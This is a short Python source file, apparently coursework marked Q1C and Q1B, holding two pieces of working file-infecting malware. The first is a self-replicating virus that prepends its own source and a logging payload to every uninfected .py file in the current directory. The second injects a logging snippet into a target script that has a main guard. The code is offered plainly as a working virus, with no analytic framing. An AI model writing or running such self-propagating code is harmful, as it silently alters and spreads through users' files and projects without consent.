
with open("Q1C.out","a") as f:
    f.write(" ".join(__import__("sys").argv) + "\n")

from pathlib import Path
import sys

LOGFILE = "Q1C.out"

#read current script code
with open(__file__, "r", encoding="utf-8") as f:
    virus_code = f.read()

#loop through other python files in the directory
for input_file in Path.cwd().glob("*.py"):
    content = input_file.read_text(encoding="utf-8")
    if "Q1C.out" in content: #if it is already infected, continue
        continue
    
    payload = (
            '\nwith open("Q1C.out","a") as f:\n'
            '    f.write(" ".join(__import__("sys").argv) + "\\n")\n')
    #adds virus to python files 
    infect_code = payload + "\n" + virus_code + "\n" + content
    input_file.write_text(infect_code, encoding="utf-8")
         

from pathlib import Path
import sys

LOGFILE = "Q1B.out"

#given parameter py file
input_file = Path(sys.argv[1])
#read file content
content = input_file.read_text(encoding="utf-8")
#if file has "if __name__=="__main__" and not infected
if (('__name__ == "__main__"' in content) and ("Q1B.out" not in content)):
    with open(LOGFILE, "a") as f:
        f.write(" ".join(sys.argv) + "\n")
    #add to file
    input_file.write_text(
            '\nwith open("Q1B.out", "a") as f:\n'
            '    f.write(" ".join(__import__("sys").argv) + "\\n")\n' + content, encoding="utf-8")

    
